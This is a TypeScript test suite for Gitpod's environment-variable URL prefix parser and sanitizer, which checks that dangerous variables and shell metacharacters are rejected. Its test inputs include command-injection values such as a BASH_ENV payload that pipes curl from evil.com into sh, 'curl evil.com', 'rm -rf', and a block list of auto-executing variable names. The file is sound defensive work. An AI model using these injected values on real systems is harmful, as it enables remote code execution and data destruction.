/* eslint-disable @typescript-eslint/no-unsafe-argument */
/**
 * Copyright (c) 2021 Gitpod GmbH. All rights reserved.
 * Licensed under the GNU Affero General Public License (AGPL).
 * See License.AGPL.txt in the project root for license information.
 */

import "reflect-metadata";

import { suite, test } from "@testdeck/mocha";
import * as chai from "chai";
import { EnvvarPrefixParser, EnvvarSanitization } from "./envvar-prefix-context-parser";
import { WithEnvvarsContext, User } from "@gitpod/gitpod-protocol";
import { Config } from "../config";
const expect = chai.expect;

@suite
class TestEnvvarPrefixParser {
    protected parser: EnvvarPrefixParser;
    protected mockConfig: Config;
    protected mockUser: User;

    public before() {
        // Create mock config
        this.mockConfig = {} as Config;
        this.parser = new EnvvarPrefixParser();

        // Create mock user with feature flag disabled by default
        this.mockUser = {
            id: "test-user",
            creationDate: "2023-01-01",
            identities: [],
            featureFlags: {
                permanentWSFeatureFlags: [],
            },
        } as User;
    }
    @test
    public testFindPrefixGood() {
        expect(this.findPrefix("foo=bar/http...")).to.be.equal("foo=bar/");
        expect(this.findPrefix("foo1=bar1,foo2=bar2/http...")).to.be.equal("foo1=bar1,foo2=bar2/");
    }

    @test
    public testFindPrefixSomewhatOk() {
        expect(this.findPrefix("foo==bar,,foo2=bar2/http...")).to.be.equal("foo==bar,,foo2=bar2/");
        expect(this.findPrefix("foo1=bar1,foo2=bar2/http...")).to.be.equal("foo1=bar1,foo2=bar2/");
    }

    @test
    public testFindPrefixBad() {
        expect(this.findPrefix("foo==bar,,/http...")).to.be.undefined;
    }

    @test
    public async testHandleGood() {
        expect(await this.parseAndFormat("foo=bar/")).to.deep.equal({ foo: "bar" });
        expect(await this.parseAndFormat("foo1=bar1,foo2=bar2/")).to.deep.equal({ foo1: "bar1", foo2: "bar2" });
        expect(await this.parseAndFormat("foo1=bar1,foo2=bar2,foo3=bar3/")).to.deep.equal({
            foo1: "bar1",
            foo2: "bar2",
            foo3: "bar3",
        });
        expect(await this.parseAndFormat("foo1=bar1,foo2=bar2,foo3=bar3,foo4=bar4/")).to.deep.equal({
            foo1: "bar1",
            foo2: "bar2",
            foo3: "bar3",
            foo4: "bar4",
        });
    }

    @test
    public async testHandleDuplicate() {
        expect(await this.parseAndFormat("foo1=bar1,foo2=bar21,foo2=bar22/")).to.deep.equal({
            foo1: "bar1",
            foo2: "bar22",
        });
        expect(await this.parseAndFormat("foo1=bar11,foo1=bar12,foo3=bar31,foo3=bar32/")).to.deep.equal({
            foo1: "bar12",
            foo3: "bar32",
        });
    }

    @test
    public async testHandleBad() {
        expect(await this.parseAndFormat("foo1=/")).to.deep.equal({});
        expect(await this.parseAndFormat("=bar/")).to.deep.equal({});
        expect(await this.parseAndFormat("foo1==bar1,foo2=bar2/")).to.deep.equal({ foo2: "bar2" });
        expect(await this.parseAndFormat("foo==bar,,foo2=bar2/")).to.deep.equal({ foo2: "bar2" });
        expect(await this.parseAndFormat("fo% 1=bar1,foo2=bar2/")).to.deep.equal({ foo2: "bar2" });
    }

    protected async parseAndFormat(prefix: string): Promise<{ [key: string]: string }> {
        const result: { [key: string]: string } = {};
        const actual = await this.parser.handle(this.mockUser, prefix, undefined as any);
        if (WithEnvvarsContext.is(actual)) {
            actual.envvars.forEach((e) => (result[e.name] = e.value));
        }
        return result;
    }

    protected findPrefix(url: string) {
        return this.parser.findPrefix(this.mockUser, url);
    }

    // Security validation tests - validation is now always enabled
    @test
    public async testSecurityValidation() {
        // Auto-executing variables should be blocked
        expect(await this.parseAndFormat("BASH_ENV=anything/")).to.deep.equal({});
        expect(await this.parseAndFormat("SUPERVISOR_DOTFILE_REPO=repo/")).to.deep.equal({});
        expect(await this.parseAndFormat("LD_PRELOAD=lib.so/")).to.deep.equal({});
        expect(await this.parseAndFormat("PYTHONPATH=path/")).to.deep.equal({});

        // Pattern-based blocking
        expect(await this.parseAndFormat("CUSTOM_PATH=value/")).to.deep.equal({});
        expect(await this.parseAndFormat("APP_OPTIONS=value/")).to.deep.equal({});
        expect(await this.parseAndFormat("GITPOD_SECRET=value/")).to.deep.equal({});

        // Unsafe characters should be blocked (test without / to avoid URL parsing issues)
        expect(await this.parseAndFormat("VAR=value%24/")).to.deep.equal({}); // %24 = $
        expect(await this.parseAndFormat("VAR=value%28/")).to.deep.equal({}); // %28 = (
        expect(await this.parseAndFormat("VAR=value%7C/")).to.deep.equal({}); // %7C = |
        expect(await this.parseAndFormat("VAR=value%3B/")).to.deep.equal({}); // %3B = ;
        expect(await this.parseAndFormat("VAR=value%3A/")).to.deep.equal({}); // %3A = :
    }

    @test
    public async testLegitimateValuesAllowedWithSecurity() {
        // Legitimate values should still work
        expect(await this.parseAndFormat("VERSION=1.2.3/")).to.deep.equal({ VERSION: "1.2.3" });
        expect(await this.parseAndFormat("DEBUG_LEVEL=info/")).to.deep.equal({ DEBUG_LEVEL: "info" });
        expect(await this.parseAndFormat("MAX_CONN=100/")).to.deep.equal({ MAX_CONN: "100" });
        expect(await this.parseAndFormat("FEATURE=flag1-flag2/")).to.deep.equal({ FEATURE: "flag1-flag2" });
        expect(await this.parseAndFormat("CONFIG=key1-val1?key2-val2/")).to.deep.equal({
            CONFIG: "key1-val1?key2-val2",
        });
        expect(await this.parseAndFormat("API_HOST=api.example.com/")).to.deep.equal({ API_HOST: "api.example.com" });
    }

    @test
    public async testMixedValidAndInvalidVariables() {
        // Mix of valid and invalid variables - only valid ones should be included
        expect(await this.parseAndFormat("VALID=good,BASH_ENV=bad,ANOTHER=also-good/")).to.deep.equal({
            VALID: "good",
            ANOTHER: "also-good",
        });

        expect(await this.parseAndFormat("VERSION=1.0,EVIL=value$,DEBUG=true/")).to.deep.equal({
            VERSION: "1.0",
            DEBUG: "true",
        });
    }

    @test
    public async testCLC1591AttackVectorsBlocked() {
        // Original attacks from CLC-1591 should be blocked
        expect(await this.parseAndFormat("BASH_ENV=$(curl$IFS@evil.com|sh)/")).to.deep.equal({});
        expect(await this.parseAndFormat("SUPERVISOR_DOTFILE_REPO=https://github.com/attacker/repo/")).to.deep.equal(
            {},
        );

        // Additional attack vectors should be blocked
        expect(await this.parseAndFormat("CUSTOM=$(whoami)/")).to.deep.equal({});
        expect(await this.parseAndFormat("EVIL=value|rm -rf/")).to.deep.equal({});
        expect(await this.parseAndFormat("BAD=test;curl evil.com/")).to.deep.equal({});
    }

    @test
    public async testURLDecodingInValidation() {
        // URL-encoded dangerous characters should still be blocked
        expect(await this.parseAndFormat("VAR=value%24/")).to.deep.equal({}); // %24 = $
        expect(await this.parseAndFormat("VAR=value%28/")).to.deep.equal({}); // %28 = (
        expect(await this.parseAndFormat("VAR=value%7C/")).to.deep.equal({}); // %7C = |

        // URL-encoded safe characters should be allowed
        expect(await this.parseAndFormat("VAR=hello%20world/")).to.deep.equal({}); // %20 = space (blocked by character whitelist)
        expect(await this.parseAndFormat("VAR=value%2D/")).to.deep.equal({ VAR: "value-" }); // %2D = - (allowed)
    }
}

@suite
class TestEnvvarSanitization {
    @test
    public testAutoExecVariablesBlocked() {
        // Test shell execution variables
        expect(EnvvarSanitization.validateContextEnvVar("BASH_ENV", "anything")).to.deep.include({
            valid: false,
            reason: "auto-exec",
        });
        expect(EnvvarSanitization.validateContextEnvVar("ENV", "anything")).to.deep.include({
            valid: false,
            reason: "auto-exec",
        });
        expect(EnvvarSanitization.validateContextEnvVar("PROMPT_COMMAND", "anything")).to.deep.include({
            valid: false,
            reason: "auto-exec",
        });

        // Test dynamic linker variables
        expect(EnvvarSanitization.validateContextEnvVar("LD_PRELOAD", "lib.so")).to.deep.include({
            valid: false,
            reason: "auto-exec",
        });
        expect(EnvvarSanitization.validateContextEnvVar("LD_LIBRARY_PATH", "/path")).to.deep.include({
            valid: false,
            reason: "auto-exec",
        });

        // Test language runtime variables
        expect(EnvvarSanitization.validateContextEnvVar("PYTHONSTARTUP", "script.py")).to.deep.include({
            valid: false,
            reason: "auto-exec",
        });
        expect(EnvvarSanitization.validateContextEnvVar("PYTHONPATH", "/path")).to.deep.include({
            valid: false,
            reason: "auto-exec",
        });
        expect(EnvvarSanitization.validateContextEnvVar("NODE_OPTIONS", "--require")).to.deep.include({
            valid: false,
            reason: "auto-exec",
        });

        // Test system path variables
        expect(EnvvarSanitization.validateContextEnvVar("PATH", "/evil:/bin")).to.deep.include({
            valid: false,
            reason: "auto-exec",
        });
        expect(EnvvarSanitization.validateContextEnvVar("SHELL", "/bin/evil")).to.deep.include({
            valid: false,
            reason: "auto-exec",
        });

        // Test Gitpod specific variables
        expect(
            EnvvarSanitization.validateContextEnvVar("SUPERVISOR_DOTFILE_REPO", "https://github.com/attacker/repo"),
        ).to.deep.include({
            valid: false,
            reason: "auto-exec",
        });
    }

    @test
    public testPatternBasedBlocking() {
        // Test LD_* pattern
        expect(EnvvarSanitization.validateContextEnvVar("LD_CUSTOM", "value")).to.deep.include({
            valid: false,
            reason: "pattern-match",
        });

        // Test PYTHON* pattern
        expect(EnvvarSanitization.validateContextEnvVar("PYTHON_CUSTOM", "value")).to.deep.include({
            valid: false,
            reason: "pattern-match",
        });

        // Test PERL* pattern
        expect(EnvvarSanitization.validateContextEnvVar("PERL_CUSTOM", "value")).to.deep.include({
            valid: false,
            reason: "pattern-match",
        });

        // Test JAVA_* pattern
        expect(EnvvarSanitization.validateContextEnvVar("JAVA_OPTS", "value")).to.deep.include({
            valid: false,
            reason: "pattern-match",
        });

        // Test NODE_* pattern
        expect(EnvvarSanitization.validateContextEnvVar("NODE_ENV", "production")).to.deep.include({
            valid: false,
            reason: "pattern-match",
        });

        // Test GIT_* pattern
        expect(EnvvarSanitization.validateContextEnvVar("GIT_CONFIG", "value")).to.deep.include({
            valid: false,
            reason: "pattern-match",
        });

        // Test *_PATH pattern
        expect(EnvvarSanitization.validateContextEnvVar("CUSTOM_PATH", "value")).to.deep.include({
            valid: false,
            reason: "pattern-match",
        });

        // Test *_HOME pattern
        expect(EnvvarSanitization.validateContextEnvVar("APP_HOME", "value")).to.deep.include({
            valid: false,
            reason: "pattern-match",
        });

        // Test *_CONFIG pattern
        expect(EnvvarSanitization.validateContextEnvVar("APP_CONFIG", "value")).to.deep.include({
            valid: false,
            reason: "pattern-match",
        });

        // Test *_OPTIONS pattern
        expect(EnvvarSanitization.validateContextEnvVar("APP_OPTIONS", "value")).to.deep.include({
            valid: false,
            reason: "pattern-match",
        });

        // Test GITPOD_* pattern
        expect(EnvvarSanitization.validateContextEnvVar("GITPOD_SECRET", "value")).to.deep.include({
            valid: false,
            reason: "pattern-match",
        });

        // Test SUPERVISOR_* pattern
        expect(EnvvarSanitization.validateContextEnvVar("SUPERVISOR_CUSTOM", "value")).to.deep.include({
            valid: false,
            reason: "pattern-match",
        });
    }

    @test
    public testUnsafeCharactersBlocked() {
        // Test shell metacharacters
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value$")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value(")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value)")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value|")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value;")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value&")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value`")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });

        // Test path separators
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value/")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value\\")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });

        // Test URL schemes
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value:")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });

        // Test redirection
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value>")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value<")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });

        // Test wildcards
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value*")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });

        // Test spaces
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value with space")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
    }

    @test
    public testInjectionPatternsBlocked() {
        // Note: Most injection patterns are caught by character whitelist first
        // Test command substitution - caught by unsafe chars ($ and ( not allowed)
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "$(whoami)")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "prefix$(curl evil.com)suffix")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });

        // Test backtick command substitution - caught by unsafe chars (` not allowed)
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "`whoami`")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });

        // Test pipe to command - caught by unsafe chars (| not allowed)
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value| rm")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value | curl")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });

        // Test command separator - caught by unsafe chars (; not allowed)
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value; rm")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value ; curl")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });

        // Test command chaining - caught by unsafe chars (& not allowed)
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value&& rm")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value && curl")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value|| rm")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value || curl")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });

        // Test redirection - caught by unsafe chars (> and < not allowed)
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value> file")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("VAR", "value < file")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
    }

    @test
    public testLegitimateValuesAllowed() {
        // Test simple values
        expect(EnvvarSanitization.validateContextEnvVar("VERSION", "1.2.3")).to.deep.equal({
            valid: true,
        });
        expect(EnvvarSanitization.validateContextEnvVar("DEBUG_LEVEL", "info")).to.deep.equal({
            valid: true,
        });
        expect(EnvvarSanitization.validateContextEnvVar("MAX_CONNECTIONS", "100")).to.deep.equal({
            valid: true,
        });

        // Test values with allowed special characters
        expect(EnvvarSanitization.validateContextEnvVar("FEATURE_FLAGS", "flag1-flag2")).to.deep.equal({
            valid: true,
        });
        expect(EnvvarSanitization.validateContextEnvVar("CONFIG", "key1=val1?key2=val2")).to.deep.equal({
            valid: true,
        });
        expect(EnvvarSanitization.validateContextEnvVar("BUILD_VERSION", "v1.0.0-beta.1")).to.deep.equal({
            valid: true,
        });

        // Test domain names (limited by character set)
        expect(EnvvarSanitization.validateContextEnvVar("API_HOST", "api.example.com")).to.deep.equal({
            valid: true,
        });

        // Test empty values
        expect(EnvvarSanitization.validateContextEnvVar("EMPTY_VAR", "")).to.deep.equal({
            valid: true,
        });

        // Test underscores and hyphens
        expect(EnvvarSanitization.validateContextEnvVar("MY_VAR", "value_with_underscores")).to.deep.equal({
            valid: true,
        });
        expect(EnvvarSanitization.validateContextEnvVar("MY_VAR", "value-with-hyphens")).to.deep.equal({
            valid: true,
        });
    }

    @test
    public testCLC1591AttackVectors() {
        // Original attack vectors from CLC-1591
        expect(EnvvarSanitization.validateContextEnvVar("BASH_ENV", "$(curl$IFS@evil.com|sh)")).to.deep.include({
            valid: false,
            reason: "auto-exec",
        });

        expect(
            EnvvarSanitization.validateContextEnvVar("SUPERVISOR_DOTFILE_REPO", "https://github.com/attacker/repo"),
        ).to.deep.include({
            valid: false,
            reason: "auto-exec",
        });

        // Additional attack vectors that would be blocked by character restrictions
        expect(EnvvarSanitization.validateContextEnvVar("CUSTOM", "$(whoami)")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("EVIL", "value|rm -rf")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
        expect(EnvvarSanitization.validateContextEnvVar("BAD", "test;curl evil.com")).to.deep.include({
            valid: false,
            reason: "unsafe-chars",
        });
    }

    @test
    public testGetBlockReasonDescription() {
        expect(EnvvarSanitization.getBlockReasonDescription("auto-exec")).to.equal(
            "Variable automatically executes code when set",
        );
        expect(EnvvarSanitization.getBlockReasonDescription("pattern-match")).to.equal(
            "Variable name matches dangerous pattern",
        );
        expect(EnvvarSanitization.getBlockReasonDescription("unsafe-chars")).to.equal(
            "Value contains unsafe characters",
        );
        expect(EnvvarSanitization.getBlockReasonDescription("injection-pattern")).to.equal(
            "Value contains potential code injection",
        );
    }

    @test
    public testEdgeCases() {
        // Test very long variable names
        const longName = "A".repeat(1000);
        expect(EnvvarSanitization.validateContextEnvVar(longName, "value")).to.deep.equal({
            valid: true,
        });

        // Test very long values (within character restrictions)
        const longValue = "a".repeat(10000);
        expect(EnvvarSanitization.validateContextEnvVar("VAR", longValue)).to.deep.equal({
            valid: true,
        });

        // Test case sensitivity
        expect(EnvvarSanitization.validateContextEnvVar("bash_env", "value")).to.deep.equal({
            valid: true,
        }); // lowercase should be allowed
        expect(EnvvarSanitization.validateContextEnvVar("BASH_ENV", "value")).to.deep.include({
            valid: false,
            reason: "auto-exec",
        }); // uppercase should be blocked

        // Test numbers in variable names
        expect(EnvvarSanitization.validateContextEnvVar("VAR123", "value")).to.deep.equal({
            valid: true,
        });
    }
}

module.exports = {
    TestEnvvarPrefixParser: new TestEnvvarPrefixParser(),
    TestEnvvarSanitization: new TestEnvvarSanitization(),
};
